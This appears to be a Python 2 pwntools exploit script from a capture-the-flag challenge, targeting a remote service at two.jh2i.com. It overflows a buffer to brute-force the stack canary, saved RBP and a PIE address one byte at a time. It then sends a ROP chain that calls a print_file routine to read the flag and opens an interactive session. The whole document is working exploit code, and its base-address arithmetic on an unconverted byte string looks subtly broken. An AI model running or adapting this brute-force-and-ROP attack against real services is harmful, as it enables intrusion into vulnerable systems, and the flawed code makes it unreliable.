from pwn import * 
import sys
context.log_level="error"
canary = "\x00"
pie = "\xc4"
rbp = ""
host = "two.jh2i.com" 
port = 50023
def brute_canary():
    global canary
    while len(canary) != 8:
        print "Byte number " + str(len(canary)) + " !"
        for i in range(256):
            p = remote(host,port)
            payload = ""
            payload += "q\n\x00"
            payload += "A"*53
            payload += canary + chr(i)
            p.send(payload)
            try:
                p.recvuntil("QUIT\n")
                data = p.recvline()
                if "Thanks" in data:
                    canary = canary + chr(i)
                    p.close()
                    print "[ + ] Found :" + hex(i)
                    break
            except:
                p.close()
                pass          
def brute_rbp():
    global canary
    global rbp
    while len(rbp) != 8:
        print "Byte number " + str(len(rbp)) +" !"
        for i in range(256):
            p = remote(host,port)
            payload = ""
            payload += "q\n\x00"
            payload += "A"*53
            payload += canary
            payload += rbp + chr(i)
            p.send(payload)
            try:
                p.recvuntil("QUIT\n")
                data = p.recvline()
                if "Thanks" in data:
                    rbp = rbp + chr(i)
                    p.close()
                    print "[ + ] Found :" + hex(i)
                    break
            except:
                p.close()
                pass
def brute_pie():
    global canary
    global rbp
    global pie
    while len(pie) != 8:
        print "Byte number " + str(len(pie)) +" !"
        for i in range(256):
            p = remote(host,port)
            payload = ""
            payload += "q\n\x00"
            payload += "A"*53
            payload += canary
            payload += rbp
            payload += pie + chr(i)
            p.send(payload)
            try:
                p.recvuntil("QUIT\n")
                data = p.recvline()
                if "Thanks" in data:
                    pie = pie + chr(i)
                    p.close()
                    print "[ + ] Found :" + hex(i)
                    break
            except:
                p.close()
                pass
brute_canary()
print "canary: ",hex(u64(canary))
print "RBP NOOOOOOOOOW"
brute_rbp()
print "rbp: ",hex(u64(rbp))
brute_pie()
print "pie: ",hex(u64(pie))
base = pie - 3524
send = base + 0x0000000000000a40
csu2 = base + 0x00000000000010e0
csu1 = base + 0x00000000000010fa
pop_rdi = base + 0x0000000000001103
pop_rsi = base + 0x0000000000001101
start_main = base + 0x0000000000201fe0
ret = base + 0x00000000000009be
flag = base + 0x1128
print_file = base + 0x0000000000000fdc
print "base :",hex(base)

rop = ""
rop += p64(pop_rdi)
rop += p64(4)
rop += p64(pop_rsi)
rop += p64(flag)
rop += p64(0xdeadbeef)
rop += p64(print_file)

payload = ""
payload += "q\n\x00"
payload += "A"*53
payload += canary
payload += rbp
payload += rop
p = remote(host,port)
p.send(payload)
p.interactive()